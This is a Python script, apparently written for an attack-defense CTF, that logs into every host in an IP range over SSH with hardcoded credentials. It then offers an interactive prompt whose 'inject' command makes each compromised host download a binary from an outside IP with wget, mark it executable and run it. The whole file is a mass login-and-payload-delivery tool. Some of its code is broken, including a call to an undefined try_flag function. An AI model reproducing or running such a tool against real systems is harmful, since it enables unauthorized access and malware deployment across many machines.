#!/usr/bin/env python
# -*- coding: utf-8 -*-

import paramiko
import string
import sys
import re
import requests
import traceback 

COMMAND = "wget http://168.172.10.13/js/check&&chmod +x check&&./check"

class SSHClient():
    def __init__(self, host, port, username, auth, timeout=5):
        self.is_root = False
        self.host = host
        self.port = port
        self.username = username
        self.ssh_session = paramiko.SSHClient()
        self.ssh_session.load_system_host_keys()
        self.ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if auth[0]:
            self.password = auth[1]
            print (self.host,self.port,self.username,self.password)
            self.ssh_session.connect(hostname=self.host, port=self.port, username=self.username, password=self.password, timeout=timeout)
        else:
            self.key_file = auth[1]
            private_key = paramiko.RSAKey._from_private_key_file(self.key_file)
            self.ssh_session.connect(hostname=host, port=port, username=username, key=private_key, timeout=timeout)

    def infomation(self):
        return "%s:%s:%s:%s" % (self.username, self.password, self.host, self.port)

    def exec_command(self, command):
        (stdin, stdout, stderr) = self.ssh_session.exec_command(command)
        return (stdin, stdout, stderr)


    def check_root(self):
        stdin, stdout, stderr = self.exec_command("id")
        result = stdout.read()
        return ("uid=0" in result, result)


def doit(iprange,username,passwd,port):
    ssh_clients = []
    ip = iprange.split('.')
    target = []
    krange = []
    for i in ip:
        ran = i.split('-')
        if len(ran) == 1:
            krange.append((i,i))
        elif len(ran) == 2:
            krange.append((ran[0],ran[1]))
    for a in range(int(krange[0][0]),int(krange[0][1])+1):
        for b in range(int(krange[1][0]),int(krange[1][1])+1):
            for c in range(int(krange[2][0]),int(krange[2][1])+1):
                for d in range(int(krange[3][0]),int(krange[3][1])+1):
                    target.append("%d.%d.%d.%d"%(a,b,c,d))

    for i in target:
        print "[+] Trying login : %s" % (i)
        try:
            ssh_client = SSHClient(i, port, username, passwd, timeout=5)
            ssh_clients.append(ssh_client)
        except Exception as e:
            print "[-]Connect Error: %s" % (e)
    print "[+] Login step finished!"
    print "[+] Got [%d] clients!" % (len(ssh_clients))

    while True:
        if len(ssh_clients) == 0:
            print "[+] No client... Breaking..."
            break
        cmd = raw_input("cmd-server$ ")
        if cmd == 'ls':
            for ssh_client in ssh_clients:
                print str(i) + ' ' + ssh_client.infomation()
        elif cmd == 'inject':
            for ssh_client in ssh_clients:
                res = ssh_client.exec_command(COMMAND)
                try_flag(res)
        elif cmd == 'exit':
            break
        else:
            print "inject it!!\ninput: inject"


if __name__ == "__main__":

    iprange = "192.168.10.1-30"
    username = "ctfuser"
    passwd = "12345"
    port = "22"

    doit(iprange,username,passwd,port)

